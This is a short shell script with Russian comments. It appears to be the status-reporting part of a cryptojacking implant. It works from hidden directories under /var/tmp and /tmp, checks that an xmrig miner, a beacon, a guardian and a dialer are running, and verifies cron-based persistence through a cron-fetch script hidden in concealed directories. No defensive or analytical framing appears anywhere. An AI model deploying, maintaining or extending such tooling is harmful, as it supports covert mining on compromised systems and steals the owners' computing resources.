#!/bin/sh
# status.sh — /tmp/.st в их формате: стадии + строка STATE.
# Запуск: sh status.sh [--watch]   (--watch — обновление раз в 60 с)
D=/var/tmp/.kf
ST=/tmp/.st

alm() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
yn()  { if "$@"; then echo OK; else echo NO; fi; }

cron_state() {
  [ -f "$D/.cron_ok" ] && { echo OK; return; }
  if command -v crontab >/dev/null 2>&1; then
    crontab -l 2>/dev/null | grep -qE 'cron-fetch|fleet-agent\.sh' && { echo OK; return; }
    echo EMPTY; return
  fi
  for d in /etc/.dd "$HOME/.usr_cron/lib" /var/tmp/.dd; do
    [ -f "$d/cron-fetch.sh" ] && { echo FILE; return; }
  done
  echo DENIED
}

write_state() {
  _b=$(cat "$D/.alias" 2>/dev/null); [ -n "$_b" ] || _b="$D/xmrig"
  {
    echo "== status =="
    echo "STATE: miner=$(yn alm "$_b -c") beacon=$(yn alm "$D/loop.sh") svc=$(yn alm "$D/svc.sh m") guardian=$(yn alm "$D/guardian.sh") dialer=$(yn alm "$D/dialer.sh") cron=$(cron_state)"
    echo "files: $(ls "$D" 2>/dev/null | tr '\n' ',')"
    echo "uptime: $(cut -d. -f1 /proc/uptime 2>/dev/null)s load: $(cut -d' ' -f1-3 /proc/loadavg 2>/dev/null)"
  } > "$ST.tmp" 2>/dev/null && mv "$ST.tmp" "$ST" 2>/dev/null || cp "$ST.tmp" "$ST" 2>/dev/null
  chmod 600 "$ST" 2>/dev/null
}

if [ "$1" = "--watch" ]; then
  while :; do write_state; sleep 60; done
fi
write_state
cat "$ST" 2>/dev/null
